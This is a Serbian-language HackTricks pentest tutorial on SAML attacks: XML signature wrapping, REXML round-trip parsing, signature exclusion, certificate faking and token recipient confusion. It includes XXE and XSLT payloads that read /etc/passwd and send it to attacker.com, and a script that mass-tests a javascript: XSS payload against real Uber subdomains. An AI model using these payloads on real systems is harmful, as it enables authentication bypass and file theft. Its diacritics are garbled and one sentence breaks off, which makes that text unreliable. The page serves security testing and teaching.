# Napadi na SAML

## Napadi na SAML

<details>

<summary><strong>Nauƒçite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naƒçini podr≈°ke HackTricks-u:

* Ako ≈æelite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJATELJSTVO**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniƒçni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), na≈°u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru≈æite se** üí¨ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Osnovne informacije

{% content-ref url="saml-basics.md" %}
[saml-basics.md](saml-basics.md)
{% endcontent-ref %}

## Alat

[**SAMLExtractor**](https://github.com/fadyosman/SAMLExtractor): Alat koji mo≈æe uzeti URL ili listu URL-ova i vratiti SAML konzumirajuƒái URL.

## XML ciklus

U XML-u, potpisani deo XML-a se ƒçuva u memoriji, zatim se vr≈°i neko enkodiranje/dekodiranje i proverava se potpis. Idealno, to enkodiranje/dekodiranje ne bi trebalo da menja podatke, ali na osnovu tog scenarija, **podaci koji se proveravaju i originalni podaci ne moraju biti isti**.

Na primer, proverite sledeƒái kod:
```ruby
require 'rexml/document'

doc = REXML::Document.new <<XML
<!DOCTYPE x [ <!NOTATION x SYSTEM 'x">]><!--'> ]>
<X>
<Y/><![CDATA[--><X><Z/><!--]]>-->
</X>
XML

puts "First child in original doc: " + doc.root.elements[1].name
doc = REXML::Document.new doc.to_s
puts "First child after round-trip: " + doc.root.elements[1].name
```
Pokretanje programa protiv REXML 3.2.4 ili ranije rezultiralo bi sledeƒáim izlazom umesto toga:
```
First child in original doc: Y
First child after round-trip: Z
```
Ovako je REXML video originalni XML dokument iz programa iznad:

![https://mattermost.com/blog/securing-xml-implementations-across-the-web/](<../../.gitbook/assets/image (1001).png>)

A ovako ga je video nakon jedne runde parsiranja i serijalizacije:

![https://mattermost.com/blog/securing-xml-implementations-across-the-web/](<../../.gitbook/assets/image (445).png>)

Za vi≈°e informacija o ranjivosti i kako je iskoristiti:

* [https://mattermost.com/blog/securing-xml-implementations-across-the-web/](https://mattermost.com/blog/securing-xml-implementations-across-the-web/)
* [https://joonas.fi/2021/08/saml-is-insecure-by-design/](https://joonas.fi/2021/08/saml-is-insecure-by-design/)

## Napadi na potpisivanje XML dokumenata

U **napadima na potpisivanje XML dokumenata (XSW)**, napadaƒçi iskori≈°ƒáavaju ranjivost koja se javlja kada se XML dokumenti obraƒëuju kroz dve razliƒçite faze: **provera potpisa** i **poziv funkcije**. Ovi napadi ukljuƒçuju izmenu strukture XML dokumenata. Konkretno, napadaƒç **ubacuje la≈æirane elemente** koji ne ugro≈æavaju validnost XML potpisa. Ova manipulacija ima za cilj stvaranje neslaganja izmeƒëu elemenata analiziranih od strane **aplikacione logike** i onih proverenih od strane **modula za proveru potpisa**. Kao rezultat, dok XML potpis ostaje tehniƒçki validan i prolazi verifikaciju, aplikaciona logika obraƒëuje **la≈æne elemente**. Stoga, napadaƒç efikasno zaobilazi **za≈°titu integriteta** i **autentikaciju porekla** XML potpisa, omoguƒáavajuƒái **ubacivanje proizvoljnog sadr≈æaja** bez otkrivanja.

Napadi su zasnovani na [**ovom blog postu**](https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/) **i** [**ovom radu**](https://www.usenix.org/system/files/conference/usenixsecurity12/sec12-final91.pdf). Stoga pogledajte ih za detaljnije informacije.

### XSW #1

* **Strategija**: Dodaje se novi koreni element koji sadr≈æi potpis.
* **Posledica**: Proveravaƒç mo≈æe biti zbunjen izmeƒëu legitimnog "Odgovor -> Tvrdnja -> Subjekt" i napadaƒçevog "zli novi Odgovor -> Tvrdnja -> Subjekt", ≈°to dovodi do problema sa integritetom podataka.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-1.svg](<../../.gitbook/assets/image (506).png>)

### XSW #2

* **Razlika u odnosu na XSW #1**: Koristi odvojeni potpis umesto obavijajuƒáeg potpisa.
* **Posledica**: "Zla" struktura, sliƒçno kao kod XSW #1, ima za cilj da prevari poslovnu logiku nakon provere integriteta.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-2.svg](<../../.gitbook/assets/image (466).png>)

### XSW #3

* **Strategija**: Zla Tvrdnja je kreirana na istom hijerarhijskom nivou kao originalna tvrdnja.
* **Posledica**: Cilj je zbuniti poslovnu logiku da koristi zlonamerni podatak.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-3.svg](<../../.gitbook/assets/image (120).png>)

### XSW #4

* **Razlika u odnosu na XSW #3**: Originalna Tvrdnja postaje dete duplicirane (zle) Tvrdnje.
* **Posledica**: Sliƒçno kao kod XSW #3, ali agresivnije menja strukturu XML dokumenata.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-4.svg](<../../.gitbook/assets/image (551).png>)

### XSW #5

* **Jedinstveni aspekt**: Ni Potpis ni originalna Tvrdnja ne prate standardne konfiguracije (obavijajuƒái/enveloping/odvojeni).
* **Posledica**: Kopirana Tvrdnja obavija Potpis, menjajuƒái oƒçekivanu strukturu dokumenta.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-5.svg](<../../.gitbook/assets/image (1030).png>)

### XSW #6

* **Strategija**: Sliƒçno ubacivanje lokacije kao kod XSW #4 i #5, ali sa preokretom.
* **Posledica**: Kopirana Tvrdnja obavija Potpis, koji zatim obavija originalnu Tvrdnju, stvarajuƒái ugnje≈æƒëenu zavaravajuƒáu strukturu.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-6.svg](<../../.gitbook/assets/image (169).png>)

### XSW #7

* **Strategija**: Element Pro≈°irenja je ubaƒçen sa kopiranom Tvrdnjom kao dete.
* **Posledica**: Ovo iskori≈°ƒáava manje restriktivnu ≈°emu Elementa Pro≈°irenja kako bi zaobi≈°ao protivmere validacije ≈°eme, posebno u bibliotekama poput OpenSAML.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-7.svg](<../../.gitbook/assets/image (971).png>)

### XSW #8

* **Razlika u odnosu na XSW #7**: Koristi drugi manje restriktivan XML element za varijantu napada.
* **Posledica**: Originalna Tvrdnja postaje dete manje restriktivnog elementa, menjajuƒái strukturu kori≈°tenu u XSW #7.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-8.svg](<../../.gitbook/assets/image (541).png>)

### Alat

Mo≈æete koristiti Burp ekstenziju [**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e) da parsirate zahtev, primenite bilo koji XSW napad koji odaberete i pokrenete ga.

## XXE

Ako ne znate kakvi su napadi XXE, molimo proƒçitajte sledeƒáu stranicu:

{% content-ref url="../xxe-xee-xml-external-entity.md" %}
[xxe-xee-xml-external-entity.md](../xxe-xee-xml-external-entity.md)
{% endcontent-ref %}

SAML odgovori su **deflacioni i base64 kodirani XML dokumenti** i mogu biti podlo≈æni napadima XML spoljnih entiteta (XXE). Manipulacijom XML strukture SAML odgovora, napadaƒçi mogu poku≈°ati da iskoriste XXE ranjivosti. Evo kako takav napad mo≈æe biti vizualizovan:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY    file SYSTEM "file:///etc/passwd">
<!ENTITY dtd SYSTEM "http://www.attacker.com/text.dtd" >]>
<samlp:Response ... ID="_df55c0bb940c687810b436395cf81760bb2e6a92f2" ...>
<saml:Issuer>...</saml:Issuer>
<ds:Signature ...>
<ds:SignedInfo>
<ds:CanonicalizationMethod .../>
<ds:SignatureMethod .../>
<ds:Reference URI="#_df55c0bb940c687810b436395cf81760bb2e6a92f2">...</ds:Reference>
</ds:SignedInfo>
<ds:SignatureValue>...</ds:SignatureValue>
[...]
```
## Alati

Takoƒëe mo≈æete koristiti Burp ekstenziju [**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e) da generi≈°e POC iz SAML zahteva kako biste testirali moguƒáe XXE ranjivosti i SAML ranjivosti.

Pogledajte takoƒëe ovaj video: [https://www.youtube.com/watch?v=WHn-6xHL7mI](https://www.youtube.com/watch?v=WHn-6xHL7mI)

## XSLT putem SAML-a

Za vi≈°e informacija o XSLT idi na:

{% content-ref url="../xslt-server-side-injection-extensible-stylesheet-language-transformations.md" %}
[xslt-server-side-injection-extensible-stylesheet-language-transformations.md](../xslt-server-side-injection-extensible-stylesheet-language-transformations.md)
{% endcontent-ref %}

Ekstenzibilni jezik transformacije stilova (XSLT) mo≈æe se koristiti za transformisanje XML dokumenata u razliƒçite formate poput HTML-a, JSON-a ili PDF-a. Va≈æno je napomenuti da se **XSLT transformacije vr≈°e pre provere digitalnog potpisa**. Ovo znaƒçi da napad mo≈æe biti uspe≈°an ƒçak i bez validnog potpisa; dovoljan je samopotpisani ili neva≈æeƒái potpis da se nastavi.

Ovde mo≈æete pronaƒái **POC** da proverite ovu vrstu ranjivosti, na hacktricks stranici pomenutoj na poƒçetku ove sekcije mo≈æete pronaƒái zahteve.
```xml
<ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
...
<ds:Transforms>
<ds:Transform>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="doc">
<xsl:variable name="file" select="unparsed-text('/etc/passwd')"/>
<xsl:variable name="escaped" select="encode-for-uri($file)"/>
<xsl:variable name="attackerUrl" select="'http://attacker.com/'"/>
<xsl:variable name="exploitUrl" select="concat($attackerUrl,$escaped)"/>
<xsl:value-of select="unparsed-text($exploitUrl)"/>
</xsl:template>
</xsl:stylesheet>
</ds:Transform>
</ds:Transforms>
...
</ds:Signature>
```
### Alat

Takoƒëe mo≈æete koristiti Burp ekstenziju [**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e) za generisanje POC-a iz SAML zahteva kako biste testirali moguƒáe XSLT ranjivosti.

Pogledajte i ovaj video: [https://www.youtube.com/watch?v=WHn-6xHL7mI](https://www.youtube.com/watch?v=WHn-6xHL7mI)

## Iskljuƒçenje XML Potpisa <a href="#xml-signature-exclusion" id="xml-signature-exclusion"></a>

**Iskljuƒçenje XML Potpisa** posmatra pona≈°anje SAML implementacija kada Element potpisa nije prisutan. Ako ovaj element nedostaje, **validacija potpisa mo≈æda se neƒáe desiti**, ƒçime postaje ranjiv. Moguƒáe je testirati ovo izmenom sadr≈æaja koji se obiƒçno proverava potpisom.

![https://epi052.gitlab.io/notes-to-self/img/saml/signature-exclusion.svg](<../../.gitbook/assets/image (457).png>)

### Alat <a href="#xml-signature-exclusion-how-to" id="xml-signature-exclusion-how-to"></a>

Takoƒëe mo≈æete koristiti Burp ekstenziju [**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e). Presretnite SAML odgovor i kliknite `Remove Signatures`. Time se uklanjaju **svi** Elementi potpisa.

Sa uklonjenim potpisima, dozvolite zahtevu da nastavi ka cilju. Ako Potpis nije potreban od strane Servisa

## Falsifikovanje Sertifikata <a href="#certificate-faking" id="certificate-faking"></a>

Falsifikovanje sertifikata je tehnika testiranja da li **Servis Provajder (SP) pravilno proverava da li je SAML Poruka potpisana** od strane pouzdanog Identity Provajdera (IdP). Ukljuƒçuje kori≈°ƒáenje \***samopotpisanog sertifikata** za potpisivanje SAML Odgovora ili Tvrdnje, ≈°to poma≈æe u proceni procesa validacije poverenja izmeƒëu SP-a i IdP-a.

### Kako sprovesti Falsifikovanje Sertifikata

Sledeƒái koraci opisuju proces kori≈°ƒáenja [SAML Raider](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e) Burp ekstenzije:

1. Presretnite SAML Odgovor.
2. Ako odgovor sadr≈æi potpis, po≈°aljite sertifikat SAML Raider Certs koristeƒái dugme `Send Certificate to SAML Raider Certs`.
3. U kartici SAML Raider Certificates, izaberite uvezeni sertifikat i kliknite `Save and Self-Sign` kako biste kreirali samopotpisani klon originalnog sertifikata.
4. Vratite se na presretnuti zahtev u Burp-ovom Proxy-u. Izaberite novi samopotpisani sertifikat iz padajuƒáe liste XML Potpisa.
5. Uklonite sve postojeƒáe potpise pomoƒáu dugmeta `Remove Signatures`.
6. Potpi≈°ite poruku ili tvrdnju novim sertifikatom koristeƒái **`(Re-)Sign Message`** ili **`(Re-)Sign Assertion`** dugme, po potrebi.
7. Prosledite potpisanu poruku. Uspe≈°na autentikacija ukazuje da SP prihvata poruke potpisane va≈°im samopotpisanim sertifikatom, otkrivajuƒái potencijalne ranjivosti u procesu validacije SAML poruka.

## Konfuzija Primaoca Tokena / Konfuzija Mete Servisa Provajdera <a href="#token-recipient-confusion" id="token-recipient-confusion"></a>

Konfuzija Primaoca Tokena i Konfuzija Mete Servisa Provajdera ukljuƒçuju proveru da li **Servis Provajder pravilno validira namenjenog primaoca odgovora**. U osnovi, Servis Provajder treba da odbije autentikacioni odgovor ako je bio namenjen drugom provajderu. Kljuƒçni element ovde je polje **Primalac**, koje se nalazi unutar elementa **SubjectConfirmationData** u SAML Odgovoru. Ovo polje specificira URL koji ukazuje gde Tvrdnja mora biti poslata. Ako stvarni primalac ne odgovara namenjenom Servisu Provajderu, Tvrdnja bi trebalo da bude progla≈°ena neva≈æeƒáom.

#### **Kako funkcioni≈°e**

Da bi SAML Konfuzija Primaoca Tokena (SAML-TRC) napad bio izvodljiv, moraju biti ispunjeni odreƒëeni uslovi. Prvo, mora postojati validan nalog na Servisu Provajderu (oznaƒçen kao SP-Legit). Drugo, ciljani Servis Provajder (SP-Target) mora prihvatiti tokene od istog Identity Provajdera koji slu≈æi SP-Legit.

Proces napada je jednostavan pod ovim uslovima. Autentiƒçna sesija se pokreƒáe sa SP-Legit putem deljenog Identity Provajdera. SAML Odgovor od Identity Provajdera ka SP-Legit je presretnut. Ovaj presretnuti SAML Odgovor, prvobitno namenjen SP-Legit, zatim je preusmeren ka SP-Target. Uspeh u ovom napadu se meri time ≈°to SP-Target prihvata Tvrdnju, omoguƒáavajuƒái pristup resursima pod istim imenom naloga koje je kori≈°ƒáeno za SP-Legit.
```python
# Example to simulate interception and redirection of SAML Response
def intercept_and_redirect_saml_response(saml_response, sp_target_url):
"""
Simulate the interception of a SAML Response intended for SP-Legit and its redirection to SP-Target.

Args:
- saml_response: The SAML Response intercepted (in string format).
- sp_target_url: The URL of the SP-Target to which the SAML Response is redirected.

Returns:
- status: Success or failure message.
"""
# This is a simplified representation. In a real scenario, additional steps for handling the SAML Response would be required.
try:
# Code to send the SAML Response to SP-Target would go here
return "SAML Response successfully redirected to SP-Target."
except Exception as e:
return f"Failed to redirect SAML Response: {e}"
```
## XSS u funkcionalnosti odjave

Originalno istra≈æivanje mo≈æe se pristupiti preko [ovog linka](https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-subdomains/).

Tokom procesa grubog pretra≈æivanja direktorijuma, otkrivena je stranica za odjavljivanje na:
```
https://carbon-prototype.uberinternal.com:443/oidauth/logout
```
Prilikom pristupa ovom linku, do≈°lo je do preusmeravanja na:
```
https://carbon-prototype.uberinternal.com/oidauth/prompt?base=https%3A%2F%2Fcarbon-prototype.uberinternal.com%3A443%2Foidauth&return_to=%2F%3Fopenid_c%3D1542156766.5%2FSnNQg%3D%3D&splash_disabled=1
```
Ovo je otkrilo da parametar `base` prihvata URL. Razmatrajuƒái to, pojavila se ideja da se URL zameni sa `javascript:alert(123);` u poku≈°aju da se pokrene XSS (Cross-Site Scripting) napad.

### Masovna eksploatacija

[Iz ovog istra≈æivanja](https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-subdomains/):

Alatka [**SAMLExtractor**](https://github.com/fadyosman/SAMLExtractor) kori≈°ƒáena je za analizu poddomena `uberinternal.com` za domene koje koriste istu biblioteku. Nakon toga, razvijen je skript koji cilja stranicu `oidauth/prompt`. Ovaj skript testira XSS (Cross-Site Scripting) uno≈°enjem podataka i proverom da li se ti podaci odra≈æavaju u izlazu. U sluƒçajevima gde se ulaz zaista odra≈æava, skript oznaƒçava stranicu kao ranjivu.
```python
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from colorama import init ,Fore, Back, Style
init()

with open("/home/fady/uberSAMLOIDAUTH") as urlList:
for url in urlList:
url2 = url.strip().split("oidauth")[0] + "oidauth/prompt?base=javascript%3Aalert(123)%3B%2F%2FFady&return_to=%2F%3Fopenid_c%3D1520758585.42StPDwQ%3D%3D&splash_disabled=1"
request = requests.get(url2, allow_redirects=True,verify=False)
doesit = Fore.RED + "no"
if ("Fady" in request.content):
doesit = Fore.GREEN + "yes"
print(Fore.WHITE + url2)
print(Fore.WHITE + "Len : " + str(len(request.content)) + "   Vulnerable : " + doesit)
```
## Reference

* [https://epi052.gitlab.io/notes-to-self/blog/2019-03-07-how-to-test-saml-a-methodology/](https://epi052.gitlab.io/notes-to-self/blog/2019-03-07-how-to-test-saml-a-methodology/)
* [https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/](https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/)\\
* [https://epi052.gitlab.io/notes-to-self/blog/2019-03-16-how-to-test-saml-a-methodology-part-three/](https://epi052.gitlab.io/notes-to-self/blog/2019-03-16-how-to-test-saml-a-methodology-part-three/)
* [https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-subdomains/](https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-subdomains/)

<details>

<summary><strong>Nauƒçite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naƒçini podr≈°ke HackTricks-u:

* Ako ≈æelite da vidite **va≈°u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** Proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniƒçni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na≈°u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru≈æite se** üí¨ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
